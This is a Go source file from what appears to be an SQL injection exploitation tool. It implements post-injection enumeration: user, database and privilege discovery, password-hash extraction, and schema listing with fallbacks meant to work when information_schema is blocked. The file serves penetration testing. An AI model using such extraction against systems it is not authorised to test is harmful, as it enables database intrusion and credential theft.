package enumeration

import (
	"context"
	"errors"
	"fmt"
	"io"
	"strings"

	"github.com/0xseif-code/vexor/internal/httpclient"
	"github.com/0xseif-code/vexor/internal/sqli"
	"github.com/0xseif-code/vexor/internal/sqli/common"
	"github.com/0xseif-code/vexor/internal/sqli/dbms"
)

// Enumerator coordinates all post-detection data extraction against one
// confirmed injection point.
type Enumerator struct {
	detector sqli.Detection
	client   *httpclient.Client
	ext      *Extractor
	queries  *dbms.Queries
	opts     Options
	progress io.Writer

	// last successfully resolved table identity + its column set, reused by
	// the dump flow so it does not re-list columns after resolving.
	lastResolvedDB      string
	lastResolvedTable   string
	lastResolvedColumns []Column
}

// NewEnumerator builds an enumerator from a confirmed detection.
func NewEnumerator(detector sqli.Detection, client *httpclient.Client) *Enumerator {
	opts := Options{Concurrency: DefaultConcurrency, Progress: io.Discard}
	return NewEnumeratorOpts(detector, client, opts)
}

// NewEnumeratorOpts builds an enumerator with explicit extraction options.
func NewEnumeratorOpts(detector sqli.Detection, client *httpclient.Client, opts Options) *Enumerator {
	if opts.Progress == nil {
		opts.Progress = io.Discard
	}
	e := &Enumerator{
		detector: detector,
		client:   client,
		queries:  dbms.Post(detector.DBMS),
		opts:     opts,
		progress: opts.Progress,
	}
	e.ext = NewExtractor(detector, client, opts)
	return e
}

// Extractor returns the underlying extractor (for advanced direct use).
func (e *Enumerator) Extractor() *Extractor { return e.ext }

// DBMS returns the normalized backend name.
func (e *Enumerator) DBMS() string { return e.ext.DB() }

// SetBase associates a latency baseline for time-based calibration.
func (e *Enumerator) SetBase(b *common.Baseline) { e.ext.SetBase(b) }

// query retrieves a single scalar string result for the given SQL query text.
func (e *Enumerator) queryString(ctx context.Context, query string) (string, error) {
	return e.ext.ExtractString(ctx, query)
}

// queryInt retrieves a single integer result for the given SQL query text.
func (e *Enumerator) queryInt(ctx context.Context, query string) (int64, error) {
	return e.ext.ExtractInt(ctx, query)
}

// CurrentUser returns the active database user.
func (e *Enumerator) CurrentUser(ctx context.Context) (string, error) {
	if e.queries == nil || e.queries.CurrentUser == nil {
		return "", unsupported("current user")
	}
	return e.queryString(ctx, e.queries.CurrentUser())
}

// CurrentDatabase returns the name of the current database.
func (e *Enumerator) CurrentDatabase(ctx context.Context) (string, error) {
	if e.queries == nil || e.queries.CurrentDB == nil {
		return "", unsupported("current database")
	}
	return e.queryString(ctx, e.queries.CurrentDB())
}

// Hostname returns the server hostname as reported by the DBMS.
func (e *Enumerator) Hostname(ctx context.Context) (string, error) {
	if e.queries == nil || e.queries.Hostname == nil {
		return "", unsupported("hostname")
	}
	return e.queryString(ctx, e.queries.Hostname())
}

// Version returns the DBMS product version banner.
func (e *Enumerator) Version(ctx context.Context) (string, error) {
	if e.queries == nil || e.queries.Version == nil {
		return "", unsupported("version")
	}
	return e.queryString(ctx, e.queries.Version())
}

// IsDBA reports whether the current user has administrative rights.
func (e *Enumerator) IsDBA(ctx context.Context) (bool, error) {
	if e.queries == nil || e.queries.IsDBA == nil {
		return false, unsupported("DBA check")
	}
	q := e.queries.IsDBA()
	v, err := e.queryString(ctx, q)
	if err != nil {
		return false, err
	}
	// True signals vary by DBMS: "Y", "t", "1", a role name, or the string
	// itself; any non-empty, non-zero value indicates privilege.
	switch strings.ToLower(strings.TrimSpace(v)) {
	case "", "0", "f", "false", "no", "none", "n", "null":
		return false, nil
	}
	return true, nil
}

// ListUsers enumerates all database accounts.
func (e *Enumerator) ListUsers(ctx context.Context) ([]User, error) {
	if e.queries == nil || e.queries.ListUsers == nil {
		return nil, unsupported("user listing")
	}
	q := e.queries.ListUsers()
	rows, err := e.ext.ExtractRows(ctx, q, 1)
	if err != nil {
		return nil, err
	}
	out := make([]User, 0, len(rows))
	for _, r := range rows {
		if len(r) == 0 {
			continue
		}
		name := r[0]
		// MySQL returns "user@host"; split for cleanliness.
		if at := strings.IndexByte(name, '@'); at >= 0 {
			out = append(out, User{Name: name[:at], Host: name[at+1:]})
		} else {
			out = append(out, User{Name: name})
		}
	}
	return out, nil
}

// PasswordHashes extracts account password hashes.
func (e *Enumerator) PasswordHashes(ctx context.Context) ([]Credential, error) {
	if e.queries == nil || e.queries.PasswordHashes == nil {
		return nil, unsupported("password hashes")
	}
	q := e.queries.PasswordHashes()
	rows, err := e.ext.ExtractRows(ctx, q, 2)
	if err != nil {
		return nil, err
	}
	out := make([]Credential, 0, len(rows))
	for _, r := range rows {
		if len(r) < 1 {
			continue
		}
		hash := ""
		if len(r) > 1 {
			hash = r[1]
		}
		name := r[0]
		if at := strings.IndexByte(name, '@'); at >= 0 {
			name = name[:at]
		}
		out = append(out, Credential{User: name, Hash: hash})
	}
	return out, nil
}

// ListPrivileges returns the current user's granted privileges/roles.
func (e *Enumerator) ListPrivileges(ctx context.Context) ([]string, error) {
	if e.queries == nil || e.queries.ListPrivileges == nil {
		return nil, unsupported("privilege listing")
	}
	rows, err := e.ext.ExtractRows(ctx, e.queries.ListPrivileges(), 2)
	if err != nil {
		return nil, err
	}
	var out []string
	for _, r := range rows {
		if len(r) > 0 {
			out = append(out, strings.Join(r, " | "))
		}
	}
	return out, nil
}

// ListDatabases enumerates database / schema names.
func (e *Enumerator) ListDatabases(ctx context.Context) ([]string, error) {
	if e.queries == nil || e.queries.ListDatabases == nil {
		return nil, unsupported("database listing")
	}
	rows, err := e.ext.ExtractRows(ctx, e.queries.ListDatabases(), 1)
	if err != nil {
		return nil, err
	}
	out := make([]string, 0, len(rows))
	for _, r := range rows {
		if len(r) > 0 && r[0] != "" {
			out = append(out, r[0])
		}
	}
	return out, nil
}

// ListTables enumerates the tables in a database. An empty db uses the current
// database.
func (e *Enumerator) ListTables(ctx context.Context, database string) ([]string, error) {
	db, err := e.resolveDatabase(ctx, database)
	if err != nil {
		return nil, fmt.Errorf("list tables: %w", err)
	}
	return e.listTablesRaw(ctx, db)
}

// ListColumns enumerates the columns of a table. The table name is resolved
// against the backend (plural/case/spelling fallbacks) before the schema is
// read. When the schema query runs but returns nothing (privileges/WAF), the
// fail-safe column chain (table-only lookup, WordPress layout, common-column
// brute force) is used so a blocked information_schema does not kill --columns.
func (e *Enumerator) ListColumns(ctx context.Context, database, table string) ([]Column, error) {
	db, tbl, err := e.ResolveTable(ctx, database, table)
	if err != nil {
		return nil, fmt.Errorf("list columns: %w", err)
	}
	// Reuse the column cache recorded by ResolveTable when it matches the
	// resolved identity, so --columns does not re-read the schema.
	if e.lastResolvedDB == db && e.lastResolvedTable == tbl && len(e.lastResolvedColumns) > 0 {
		return append([]Column(nil), e.lastResolvedColumns...), nil
	}
	cols, err := e.listColumnsRaw(ctx, db, tbl)
	if err != nil {
		return nil, fmt.Errorf("list columns for %s.%s: %w", db, tbl, err)
	}
	if len(cols) == 0 {
		fallback, ferr := e.resolveColumnSet(ctx, db, tbl)
		if ferr != nil {
			return nil, fmt.Errorf("list columns for %s.%s: %w", db, tbl, ferr)
		}
		cols = fallback
	}
	return cols, nil
}

// CountRows returns the number of rows in a table. The table name is resolved
// before the count is taken.
func (e *Enumerator) CountRows(ctx context.Context, database, table string) (int64, error) {
	db, tbl, err := e.ResolveTable(ctx, database, table)
	if err != nil {
		return 0, fmt.Errorf("count rows: %w", err)
	}
	return e.countRowsRaw(ctx, db, tbl)
}

// resolveDatabase returns the provided database name, or the current one when
// empty.
func (e *Enumerator) resolveDatabase(ctx context.Context, database string) (string, error) {
	if strings.TrimSpace(database) != "" {
		return strings.TrimSpace(database), nil
	}
	cur, err := e.CurrentDatabase(ctx)
	if err != nil {
		return "", err
	}
	if strings.TrimSpace(cur) == "" {
		return "", errors.New("current database name is empty")
	}
	return cur, nil
}

func unsupported(what string) error {
	return fmt.Errorf("%s is not supported for this DBMS", what)
}

// progressf writes a formatted line to the configured progress writer.
func (e *Enumerator) progressf(format string, args ...any) {
	if e.progress != nil {
		fmt.Fprintf(e.progress, format+"\n", args...)
	}
}
